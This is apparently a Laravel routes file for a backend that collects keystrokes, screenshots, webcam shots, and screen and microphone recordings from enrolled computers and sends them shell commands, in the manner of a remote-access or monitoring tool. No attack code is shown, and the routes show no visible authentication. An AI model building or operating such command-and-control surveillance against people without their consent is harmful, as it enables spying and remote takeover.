<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\TaskController;
use App\Http\Controllers\ErrorsController;
use App\Http\Controllers\screenShotController;
use App\Http\Controllers\ComputerController;
use App\Http\Controllers\CameraShotController;
use App\Http\Controllers\ScreenRecordingController;
use App\Http\Controllers\MicrophoneRecordingController;
use App\Http\Controllers\KeyController;
use App\Http\Controllers\WindowController;
use App\Http\Controllers\CommandController;
use App\Http\Controllers\ShellController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});

Route::prefix('actions')->group([],function(){
   Route::get('add',function(){return "added";});
   Route::get('/delete',function(){return "deleted";});
});

Route::get('/books/title/{title}', function ($title) {
    return "hello world"."\n\nthe book tile is:".$title;
})->name('test.show')->middleware('signed');

Route::middleware('throttle:5,1')->get('/test', function () {
    return view('test');
});

Route::get('/task',[TaskController::class, 'index']);

Route::get('/db',[TaskController::class, 'db']);



Route::get('/putError/computer_serial/{computer_serial}/company_id/{company_id}/module/{module}/error/{error}',[ErrorsController::class, 'store']);

Route::post('/putScreenShot',[screenShotController::class, 'store']);

Route::get('/putComputer/computer_serial/{computer_serial}/company_id/{company_id}/cpuArch/{cpuArch}/osArch/{osArch}/osType/{osType}/computer_name/{computer_name}',[ComputerController::class, 'store']);

Route::post('/putCameraShot',[CameraShotController::class, 'store']);

Route::post('/putScreenRecording',[ScreenRecordingController::class, 'store']);

Route::post('/putMicrophoneRecording',[MicrophoneRecordingController::class, 'store']);

Route::post('/putKeys',[KeyController::class, 'store']);

Route::post('/putWindows',[WindowController::class, 'store']);

Route::get('/getCommands/computer_serial/{computer_serial}/company_id/{company_id}',[CommandController::class, 'getCommands']);

Route::get('/putCommandStatus/commandId/{id}/status/{status}',[CommandController::class, 'PutCommandStatus']);

Route::post('/putCommandFeedBack',[CommandController::class, 'PutCommandFeedBack']);

Route::post('/putFile',[CommandController::class, 'PutFile']);

Route::get('/getShellCommands/computer_serial/{computer_serial}/company_id/{company_id}',[ShellController::class, 'getShellCommands']);

Route::get('/putShellCommandStatus/commandId/{id}/status/{status}',[ShellController::class, 'PutShellCommandStatus']);

Route::post('/putShellCommandFeedBack',[ShellController::class, 'PutShellCommandFeedBack']);